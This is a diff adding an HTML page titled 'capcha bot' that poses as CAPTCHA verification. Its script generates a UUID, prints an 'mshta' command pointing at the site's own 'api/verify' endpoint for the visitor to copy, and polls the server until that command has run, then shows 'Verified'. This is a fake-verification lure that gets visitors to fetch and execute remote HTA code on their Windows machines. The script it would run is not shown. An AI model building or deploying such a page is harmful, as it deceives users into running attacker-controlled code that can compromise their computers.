@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>capcha bot </title>
+</head>
+<body>
+  <script>
+
+
+
+        function generateUUIDFallback() {
+            return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+                const r = Math.random() * 16 | 0;
+                const v = c === 'x' ? r : (r & 0x3 | 0x8);
+                return v.toString(16);
+            });
+        }
+        function generateAndDisplayUUID() {
+            if (window.crypto && window.crypto.randomUUID) {
+                const uuid = window.crypto.randomUUID();
+                return uuid
+            } else {
+                document.getElementById('uuidOutput').innerText = 'Your browser does not support crypto.randomUUID().';
+                // Fallback to a custom implementation if needed
+                return generateUUIDFallback()
+            }
+        }
+
+        const uuid = generateAndDisplayUUID()
+        const cmdforusertocopy = "mshta " + location.href.split('captcha.html')[0] + "api/verify?verify=" + uuid
+        const urltofetch = location.href.split('captcha.html')[0] + "api/verify?waitfor=" + uuid
+        document.body.innerHTML+= (cmdforusertocopy)
+        const xmlhttprequest = new XMLHttpRequest()
+        xmlhttprequest.onreadystatechange = function () {
+          if (this.readyState == 4 && this.status == 200) {
+
+          document.body.innerHTML += "<br>Verified " + this.responseText
+
+          }
+        }
+        xmlhttprequest.open('GET', urltofetch)
+        xmlhttprequest.send()
+  </script>
+</body>
+</html>
